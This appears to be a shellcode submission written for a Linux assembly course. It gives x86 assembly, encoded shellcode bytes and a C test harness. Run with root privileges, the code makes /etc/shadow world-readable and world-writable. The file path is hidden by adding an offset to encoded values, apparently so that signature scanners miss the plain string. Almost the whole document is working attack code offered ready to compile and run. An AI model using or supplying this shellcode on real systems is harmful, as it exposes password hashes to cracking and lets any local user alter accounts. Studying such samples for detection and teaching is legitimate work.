#---------------------- DESCRIPTION -------------------------------------#

; Title: chmod(“/etc/shadow”, 0666) and exit for Linux/x86 - Polymorphic
; Author: Daniel Ortiz
; Tested on: Linux 4.18.0-25-generic #26 Ubuntu
; Size: 53 bytes
; SLAE ID: PA-9844


#---------------------- ASM CODE ------------------------------------------#


SECTION .data

	EXIT_CALL equ 1
	CHMOD_CALL equ 15

SECTION .text


global _start


 _start:
     	nop
	cdq

	push byte CHMOD_CALL
	pop eax


	push edx
	push byte 0x77
	push word 0x6f64

	mov esi, 0x222933f0
	add esi, 0x3f3f3f3f
	push esi
	xor esi, esi

	mov esi, 0x243525f0
	add esi, 0x3f3f3f3f
	push esi
	xor esi, esi


	mov ebx, esp
	push word 0666Q
	pop ecx
	int 0x80

	mov al, EXIT_CALL
	int 0x80


#------------------------- final shellcode ----------------------------------------#

unsigned char buf[] =
"\x90\x99\x6a\x0f\x58\x52\x6a\x77\x66"
"\x68\x64\x6f\xbe\xf0\x33\x29\x22\x81"
"\xc6\x3f\x3f\x3f\x3f\x56\x31\xf6\xbe"
"\xf0\x25\x35\x24\x81\xc6\x3f\x3f\x3f"
"\x3f\x56\x31\xf6\x89\xe3\x66\x68\xb6"
"\x01\x59\xcd\x80\xb0\x01\xcd\x80";


#------------------------- usage --------------------------------------------------#


#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x90\x99\x6a\x0f\x58\x52\x6a\x77\x66\x68\x64\x6f\xbe\xf0\x33\x29\x22\x81\xc6\x3f\x3f\x3f\x3f\x56\x31\xf6\xbe\xf0\x25\x35\x24\x81\xc6\x3f\x3f\x3f\x3f\x56\x31\xf6\x89\xe3\x66\x68\xb6\x01\x59\xcd\x80\xb0\x01\xcd\x80";


main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}